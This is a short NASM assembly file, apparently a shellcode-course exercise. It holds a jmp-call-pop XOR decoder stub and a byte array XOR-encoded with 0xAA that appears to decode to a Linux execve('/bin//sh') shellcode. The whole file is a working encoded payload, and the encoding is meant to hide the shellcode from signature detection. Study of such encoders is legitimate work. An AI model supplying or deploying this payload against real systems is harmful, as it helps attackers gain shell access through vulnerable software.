;author 60dhi
;filename xorEncoder.nasm
;This code creates a xor decoder stub, decoded the xored shellcode under the label Shellcode using jmp call pop technique
;without using a static counter of 25 (length of the shellcode)
;Appended 0xaa at the end of the shellcode 


global _start

section .text

_start:
	jmp short call_decoder

decoder:
	pop esi

decode:
	xor byte [esi], 0xAA
	;if the above operation results to a zero, jump to label Shellcode
	jz Shellcode
	inc esi
	jmp short decode


call_decoder:
	
	call decoder
	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa
